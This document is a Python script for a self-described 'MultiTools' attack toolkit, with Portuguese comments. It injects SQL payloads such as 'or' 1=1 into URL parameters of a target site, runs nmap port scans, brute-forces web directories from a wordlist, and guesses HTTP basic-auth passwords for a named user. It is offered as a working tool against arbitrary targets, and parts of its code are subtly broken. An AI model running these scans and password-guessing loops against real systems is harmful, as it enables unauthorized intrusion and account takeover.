#!/usr/bin/env python3
# Desenvolvido por Deivid Willayn / https://www.facebook.com/DeividWillyan

import sys, urllib, urllib.request, hashlib, os, simplejson, urllib.parse, optparse, nmap, requests

####################################################################################################################

#Deivid Willyan
#MuiltiTools 30/11/2015 VersÃ£o 0.7
#Adicionado na VersÃ£o 0.7 Crawler, Implementar futuramente thread para melhor performece.
#Adicionado na VersÃ£o 0.7 Wordlist.

################################################# BANNER ########################################################### 

print("""\033[01;35m 
     	             _ _   _ _____            _     
         /\/\  _   _| | |_(_)__   \___   ___ | |___ 
        /    \| | | | | __| | / /\/ _ \ / _ \| / __|
       / /\/\ \ |_| | | |_| |/ / | (_) | (_) | \__|
       \/    \/\__,_|_|\__|_|\/   \___/ \___/|_|___/
                                       Deivid Willyan @ZeusHz

OpÃ§Ãµes: 
	 -u 				URL para teste de SQLi
	 -g 				Efetur uma busca no google
	 -n 				Utilizar Nmap Scanner
	 -c 				Utilizar Web Crawler
	 -l 				Utilizar Wordlist

Exemplo:
	  ./MuiltiTools.py  -h
	  ./MuiltiTools.py  -g pesquisa no google
	  ./MuiltiTools.py  -u http://www.alvo.com/noticias.php?id=1
	  ./MuiltiTools.py  -c http://www.alvo.com
	  ./MuiltiTools.py  -c http://www.alvo.com -l /tmp/wordlist.txt
	  ./MuiltiTools.py  -n www.alvo.com
	  ./MuiltiTools.py  -t 192.168.0.1 -U admin -l /tmp/wordlist.txt 
	\033[0m""")

############################################# TESTE DE SQLi ########################################################

def SqlInjectionTeste():
	
	sqlvetor = ["\'", "\'or\' 1=1", "1\' or \'1\' = \'1\'"]

	urlcompleta = url		
	procuraHttp = urlcompleta.find('http' or 'https')
	if procuraHttp < 0:
		print ("\033[01;31m\n[ERRO] O Site deve conter http:// \033[0m\n\n")
	else:
		pass	
	
	retorno = urlcompleta.find('=')
	corte = urlcompleta[:retorno + 1]
	urlVetor = [str(corte), str(urlcompleta)] 
		
	for i in range(3):
		for j in range(2):
			stringSql = urlVetor[j] + sqlvetor[i]
			print (stringSql)
			x = urllib.request.urlopen(stringSql)
			y = x.read()
			z = y.decode('iso-8859-1' or 'utf-8')

			if (("Warning") in z) or (("MySQL") in z) or (("syntax") in z): 
				print ("\033[01;37m[V] Possivelmente Vulneravel...\033[0m\n")
			else:
				print ("\033[01;31m[X] NÃ£o Vulneravel...\033[0m\n")

############################################# PROCURA NO GOOGLE #####################################################

def buscaNoGoogle():
	
	queryDaBusca = urllib.parse.urlencode({'q' : google})
	url = 'http://ajax.googleapis.com/ajax/services/search/web?v=1.0&%s&start=0' % (queryDaBusca)
	resultadosDaBusca = urllib.request.urlopen(url, None, None)
	json = simplejson.loads(resultadosDaBusca.read())
	results = json['responseData']['results']
	for i in results:
		y = i['url']
		x = y.replace("%3F", "?")
		z = x.replace("%3D", "=")
		print (z)

################################################ NMAP SCANNER #######################################################

def nmapScanner():

	nm = nmap.PortScanner()
	nm.scan(nmapScan)
	nm.command_line()
	nm.scaninfo()
	nm.all_hosts()
	
	for host in nm.all_hosts():
		print('----------------------------------------------------')
		print('Host : %s (%s)' % (host, nm[host].hostname()))	
		print('Status : %s' % nm[host].state())

	for proto in nm[host].all_protocols():
		print('----------')
		print('Protocolo : %s' % proto)

	lport = nm[host][proto].keys()
	for port in lport:
		print('porta : %s\tstatus : %s' % (port, nm[host][proto][port]['state']))

############################################# CRAWLER ###############################################################

def crawler():	

	if wordlist != None:
		wordlist_file = wordlist
	else:
		wordlist_file = "/pentest/wordlist/diretorios/all.txt"	

	alvo = crawlerscan

	fd = open(wordlist_file, "r")
	raw_words = fd.readlines()
	fd.close()

	for word in raw_words:
		word = word.rstrip()	

		url = "%s/%s" %(alvo, word)

		try:
			x = urllib.request.urlopen(url).getcode()
			if x == 200:
				print ("[%d] => %s" % (x, url))
		except urllib.error.HTTPError as x:
			if x.code != 404:
				print ("[%d] => %s" % (x.code, url))
			pass

############################################# BRUTE FORCE ###########################################################

def bruteForce(target, usuario, wordlist):
	
	fd = open(wordlist, 'r')
	passwords = fd.readlines()
	i = 0
    
	for password in passwords:
		i = i + 1

		password = password.rstrip()
        
		test = requests.get('http://'+target, auth=(usuario, password))
		code = test.status_code

		print('[%s]         USER[%s]          PASS [%s]' % (i,usuario,password))
        
		if code == 200:
			print("")
			print("========================[LOGIN ENCONTRADO]========================")
			print("")
			print("               [  :: USER[%s] AND PASS[%s]  ]                      " % (usuario, password))
			print("")

			sys.exit()
		else:
			pass

############################################# MENU DE OPÃ‡Ã•ES ########################################################

parser = optparse.OptionParser()
parser.add_option("-u", dest="url", type="string", help="Digite a URL")
parser.add_option("-g", dest="google", type="string", help="Pesquisa no Google")
parser.add_option("-n", dest="nmapScan", type="string", help="Scanner Nmap")
parser.add_option("-c", dest="crawlerscan", type="string", help="Web Crawler Scanner")
parser.add_option("-l", dest="wordlist", type="string", help="Wordlist Crawler")
parser.add_option("-U", dest="usuario", type="string", help="Usuario")
parser.add_option("-t", dest="target", type="string", help="Alvo")

(options, args) = parser.parse_args()

url = options.url
google = options.google
nmapScan = options.nmapScan
crawlerscan = options.crawlerscan
wordlist = options.wordlist
usuario = options.usuario
target = options.target

#Chama os Metodos dependendo do argumento passado.

if (url):
	SqlInjectionTeste()
elif (google):
	buscaNoGoogle()
elif (nmapScan):
	nmapScanner()
elif (crawlerscan):
	crawler()
elif (target and usuario and wordlist):
	bruteForce(target,usuario, wordlist)
